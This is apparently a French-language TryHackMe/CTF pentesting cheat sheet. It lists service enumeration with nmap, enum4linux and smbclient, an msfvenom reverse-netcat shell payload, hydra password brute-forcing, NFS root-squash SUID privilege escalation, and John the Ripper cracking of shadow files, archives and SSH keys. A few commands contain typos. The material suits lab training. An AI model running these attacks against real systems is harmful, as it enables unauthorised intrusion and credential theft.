# CTF-THM-Cheat-Sheet

Les ports indiqué sont ceux par défaut

## Scan ports :

https://github.com/hakluke/Internal-Pentest-Playbook/blob/master/4%20-%20Scanning-and-Enumeration.md

https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets#nmap

https://hacklido.com/blog/464-the-ultimate-guide-to-port-scanning-using-nmap-nmap-notes

nmap --scrript vuln [ip] t-4


## Shell

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md

## Exploitation des services réseaux :

### Enumération SMB

Enum4Linux :

Outils pour énumérer les partages SMB sur les systèmes Windows et Linux.

ports : 139/445

https://github.com/portcullislabs/enum4linux

-U             get userlist

-M             get machine list

-N             get namelist dump (different from -U and-M)

-S             get sharelist

-P             get password policy information

-G             get group and member list

-a             all of the above (full basic enumeration)


enum4linux [options] [ip]

### Exploiter SMB

Pour accéder aux ressources du ressources nous utilisons un client SMB.

-U [name] : to specify the user

-p [port] : to specify the port

smbclient //[IP]/[SHARE]

essayer d'exploiter eternalblue

### Enumération Telnet

nmap port 23

### Exploiter telnet

Tenter une connection :

telnet [ip] [port]

Tenter un reverse shell :

Démmarer l'écoute d'un port sur interface de la machine local 
:

sudo tcpdump ip proto \\icmp -i [interface]

Générer une payload :

-p = payload

lhost = our local host IP address (this is your machine's IP address)

lport = the port to listen on (this is the port on your machine)

R = export the payload in raw format

msfvenom -p cmd/unix/reverse_netcat lhost=[local ip] lport=4444 R

### Enumération FTP

nmap port 21

### Exploiter FTP

Se connecter en anonymous :

ftp [IP]

Attaque par dictionnaire pour déterminer si nous sommes en possesion d'un nom d'utilisateur :

hydra                   Runs the hydra tool

-t 4                    Number of parallel connections per target

-l [user]               Points to the user who's account you're trying to compromise

-P [path to dictionary] Points to the file containing the list of possible passwords

-vV                     Sets verbose mode to very verbose, shows the login+pass combination for each attempt

[machine IP]            The IP address of the target machine

hydra -t 4 -l [user] -P /usr/share/wordlists/rockyou.txt -vV [IP] ftp

### Enumeration NFS

Installer nfs-common

```sh
sudo apt install nfs-common
```
https://packages.ubuntu.com/jammy/nfs-common

nmap scan ports 111/2049

Monter des partages NFS :


Le client a besoin d'un répertoire où tout le contenu partagé du serveur  dans le dossier d'exportation est accessible, vous pouvez utiliser la commande "mount" pour connecter le partage NFS au point de montage sur votre machine.

créer le répertoire sur la machine local :

mkdir /tmp/mount



mount	Execute the mount command

-t nfs	Type of device to mount, then specifying that it's NFS

IP:share	The IP Address of the NFS server, and the name of the share we wish to mount

-nolock	Specifies not to use NLM locking


sudo mount -t nfs IP:share /tmp/mount/ -nolock



Pour lister les partages NFS :

/usr/sbin/showmount -e [IP]

### Exploitation NFS

Si root-squash est désactivé : 

- Avoir un shell avec des faibles privilèges

- créer un script le mettre dans le dossier partage nfs 

- Donner le droit à l'utilisateur de l'exécuter

- Donner la propriété du fichier à root

- Ajouter l'autorisation de bit SUID au fichier chmod +s fichier

- Connection sur la machine cible

- Exécuter le fichier ./fichier -p 

 Le -p conserve les autorisations, de sorte à ce qu'il  s'exécute en tant que root avec SUID, sinon les autorisations peuvent être supprimées.

### Enumeration SMTP

 nmap port 25

Énumération des détails du serveur :

- Utiliser le module smtp-version (auxiliary) Metasploit

Énumération des utilisateurs à partir de SMTP :

Le service SMTP dispose de deux commandes internes qui permettent l'énumération des utilisateurs : VRFY (confirmant les noms des utilisateurs valides) et EXPN (qui révèle l'adresse réelle des alias et des listes d'e-mails de l'utilisateur (listes de diffusion)). À l'aide de ces commandes SMTP , nous pouvons révéler une liste d'utilisateurs valides.

Pour énumérer utiliser le module metasploit smtp_enum (auxiliary).

Nous pouvons énumer des utilisateurs avec smtp-user-enum :

(https://www.kali.org/tools/smtp-user-enum/)

### Exploitation SMTP

Tenter une attaque par dictionnaire sur un service comme ssh si un nom d'utilisateur a été récupéré avec hydra.

### Enumératration MySQL    
nmap scan port 3306
Installer un client mysql :

sudo apt install default-mysql-client

Si nous avons des informations d'authentification :

mysql -h [IP] -u [username] -p

Si nos informations sont corrects, utilisons ce module metasploit :

mysql_sql

Nous pouvons modifier la commande du module.

### Exploitation Mysql

Utiliser le module mysql_schemadump metasploit pour extraire des informations schema.

Ressources supplémentaires conseillée par Tryhackme :

 https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/4/html/security_guide/ch-exploits
 
 https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/

## Craquage de mot de passe

Pour identifier format de hash :

https://www.kali.org/tools/hash-identifier/

### JohnTheRipper

#### Craquage automatique :

john --wordlist=[path to wordlist] [path to file]

#### Craquage spécifique au format :

john --format=[format] --wordlist=[path to wordlist] [path to file]

Si les formats sont ajouter raw-

#### Craquage des hachages /etc/shadow

Unshadowing

Si l'on a les fichiers passwd et shadow nous pouvons tenter de  déchiffrer les mot de passes :

unshadow [path to passwd] [path to shadow] > [result].txt


#### Craquage unique :

Pour que john trouve le bon mot de passe seul, il faudra lancer la commande suivante :

john --single --format=[format] [path to file]

Dans le fichier il faudra adopter la syntaxe suivante :

username:hash

#### Craquage d'un fichier zip protégé par mot de passe :

zip2john [options] [zip file] > [output file]

john --wordlist=/usr/share/wordlists/rockyou.txt [output file]

#### Craquage d'une archive RAR protégée par mot de passe :

rar2john [rar file] > [output file]

john --wordlist=/usr/share/wordlists/rockyou.txt [output file]


#### Craquage des mots de passe clés SSH :

ssh2john [id_rsa private key file] > [output file]

[id_rsa private key file]- Le chemin vers le fichier id_rsa dont vous souhaitez obtenir le hachage

john --wordlist=/usr/share/wordlists/rockyou.txt [output file]

https://github.com/openwall/john

## Exploitation d'une application web :

- Découvrir l'application + Voir le code source

- énumération fichiers-dossiers avec gobuster

- Repérer les entrées (url, formulaires, etc...)

- Exploiter les entrées

## Escalation des privilèges :

Utiliser GTFOBins 

GTFOBins est une liste organisée de fichiers binaires Unix qui peuvent être utilisés pour contourner les restrictions de sécurité locales dans les systèmes mal configurés.

https://gtfobins.github.io/

https://www.hackingarticles.in/linux-privilege-escalation-automated-script/

https://github.com/Ignitetechnologies/Privilege-Escalation

autres ressources :

https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md

https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html

https://payatu.com/guide-linux-privilege-escalation

https://book.hacktricks.xyz/